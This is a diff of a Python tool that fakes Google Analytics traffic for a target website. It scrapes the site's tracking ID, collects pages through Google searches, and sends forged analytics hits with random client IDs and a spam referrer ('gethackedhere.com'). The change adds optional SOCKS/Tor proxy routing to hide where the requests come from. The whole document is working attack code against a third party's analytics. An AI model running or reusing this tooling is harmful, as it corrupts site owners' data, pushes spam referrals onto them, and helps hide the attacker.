@@ -1,5 +1,5 @@
 import sys
-import requests
+import requests #pip install requests[socks] to get socks for TOR
 import re
 import time
 import random
@@ -12,8 +12,13 @@ from threading import Thread
 #https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid
 
 def main():
+    global proxies
+    proxies = {
+        #'http': 'socks5://192.168.0.103:9100',
+        #'https': 'socks5://192.168.0.103:9100'
+    }
     logging.basicConfig(level=logging.INFO)
-    session = single_page_attack_session(target_url='http://zonksec.com', referral_url='https://test.com/mypage.php', bounces=2, session_jitter=.50,session_delay=5, end_with=True,geo_id=1021747)
+    session = single_page_attack_session(target_url='http://zonksec.com', referral_url='https://gethackedhere.com/', bounces=2, session_jitter=.50,session_delay=5, end_with=True)
     single_page_attack(session=session, number_of_sessions=5, threads=2)
 
 
@@ -47,7 +52,7 @@ def thread_session(i,q,session,delay=5,jitter=.50):
         q.task_done()
 
 class single_page_attack_session:
-    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, loop=1, end_with=True, tracking_id=None, geo_id=''):
+    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, loop=1, end_with=True, tracking_id=None, geo_id=''):
         self.target_url = target_url
         self.referral_url = referral_url
         self.page_delay = session_delay
@@ -60,29 +65,24 @@ class single_page_attack_session:
         self.used_cids = []
         self.client_id = self.random_unique_cid()
         self.tracking_id = tracking_id
+        self.bounce_pool = bounce_pool
 
         #end_with logic
         if self.bounces == 0:
             self.end_with = False
 
+        #grabs tracking ID from target site.
         if self.tracking_id is None:
-            page = requests.get(target_url)
+            page = requests.get(target_url,proxies=proxies)
             m = re.search("'(UA-(.*))',", page.text)
             self.tracking_id = str(m.group(1))
 
         #if bounce urls are need, collects them.
-        if self.bounces <= 10 and self.bounces != 0 and self.bounce_urls is None:
+        if self.bounces != 0 and self.bounce_urls is None:
             logging.info('[*] Bounce URLs are needed.')
             self.bounce_urls = []
-            search_results = list(google.search(query="site:"+self.target_url, num=10,stop=1))
+            search_results = list(google.search(query="site:"+self.target_url, num=self.bounce_pool,stop=1))
             logging.info('[+] Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
-            for result in search_results:
-                self.bounce_urls.append(str(result))
-        elif self.bounces > 10 and self.bounce_urls is None:
-            logging.info('[*] Bounce URLs are needed.')
-            self.bounce_urls = []
-            search_results = list(google.search(query="site:"+self.target_url, num=self.bounces,stop=1))
-            logging.info('Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
             for result in search_results:
                 self.bounce_urls.append(str(result))
 
@@ -151,7 +151,7 @@ class analytics_request:
         self.anon_ip = anon_ip
 
         if self.tracking_id is None:
-            page = requests.get(document_location)
+            page = requests.get(document_location,proxies=proxies)
             m = re.search("'(UA-(.*))',", page.text)
             self.tracking_id = str(m.group(1))
 
@@ -167,7 +167,7 @@ class analytics_request:
         params['geoid'] = self.geo_id
         params['ua'] = self.user_agent
 
-        r = requests.post('https://www.google-analytics.com/collect', data=params)
+        r = requests.post('https://www.google-analytics.com/collect', data=params,proxies=proxies)
         logging.debug('[*] Request Sent. ' + str(params))
 
 
